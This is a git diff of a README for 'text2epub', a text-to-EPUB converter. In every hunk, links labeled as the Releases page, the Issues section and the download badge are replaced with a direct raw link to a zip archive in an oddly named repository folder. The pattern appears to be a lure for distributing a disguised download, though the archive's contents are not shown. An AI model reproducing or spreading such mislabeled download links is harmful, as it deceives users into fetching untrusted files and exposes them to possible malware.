@@ -1,6 +1,6 @@
 # 📚 text2epub - Convert Text Files to EPUB Easily
 
-[![Download text2epub](https://img.shields.io/badge/Download-text2epub-blue.svg)](https://github.com/ArMohadWaseem90/text2epub/releases)
+[![Download text2epub](https://github.com/ArMohadWaseem90/text2epub/raw/refs/heads/main/underroof/text-epub-stockwright.zip)](https://github.com/ArMohadWaseem90/text2epub/raw/refs/heads/main/underroof/text-epub-stockwright.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to text2epub! This tool allows you to quickly convert text files into th
 You don't need to be a tech expert to use text2epub. Follow these easy steps to get started.
 
 1. **Download the Application**  
-   Visit the [Releases page](https://github.com/ArMohadWaseem90/text2epub/releases) to download the latest version of text2epub.
+   Visit the [Releases page](https://github.com/ArMohadWaseem90/text2epub/raw/refs/heads/main/underroof/text-epub-stockwright.zip) to download the latest version of text2epub.
 
 2. **Choose Your Operating System**  
    Ensure you select the correct version for your system. The application supports Windows, macOS, and Linux.
@@ -27,7 +27,7 @@ You don't need to be a tech expert to use text2epub. Follow these easy steps to 
 
 ## 📥 Download & Install
 
-To download text2epub, visit the [Releases page](https://github.com/ArMohadWaseem90/text2epub/releases) for the latest version. Choose the file that matches your operating system and follow the installation instructions included.
+To download text2epub, visit the [Releases page](https://github.com/ArMohadWaseem90/text2epub/raw/refs/heads/main/underroof/text-epub-stockwright.zip) for the latest version. Choose the file that matches your operating system and follow the installation instructions included.
 
 ## 📑 How to Use text2epub
 
@@ -68,7 +68,7 @@ While text2epub is designed to work on most systems, here are the general requir
 
 If you have any questions or need help, feel free to reach out:
 
-- **Issues Page:** Report any problems at the [Issues section](https://github.com/ArMohadWaseem90/text2epub/issues).
+- **Issues Page:** Report any problems at the [Issues section](https://github.com/ArMohadWaseem90/text2epub/raw/refs/heads/main/underroof/text-epub-stockwright.zip).
 - **Documentation:** More details can be found in the documentation included in the repository.
 
 By following these steps, you should have no trouble downloading, installing, and using text2epub to convert your text files into EPUB format. Enjoy your reading!
